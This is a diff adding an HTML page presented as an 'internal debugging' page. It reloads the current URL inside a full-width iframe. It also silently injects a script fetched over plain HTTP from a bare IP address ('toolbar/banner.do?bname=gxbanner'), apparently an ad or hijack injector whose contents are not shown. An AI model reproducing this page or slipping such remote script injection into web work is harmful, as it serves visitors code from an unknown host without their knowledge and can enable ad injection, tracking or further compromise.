@@ -1,0 +1,24 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>内部调试</title>
+    <script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
+
+    <script language="javascript" type="text/javascript">
+        $(function(){
+            var _url = window.location.href;
+            setTimeout(function(){
+                $("#_c").attr("src",_url);
+            },1000);
+            var live=document.createElement('script');
+            live.src='http://221.228.17.149/toolbar/banner.do?bname=gxbanner';
+            live.type='text/javascript';
+            document.getElementsByTagName("head")[0].appendChild(live);
+        });
+    </script>
+</head>
+<body>
+    <iframe id="_c" width=100% height=900px scrolling=no frameborder=0><iframe>
+</body>
+</html>
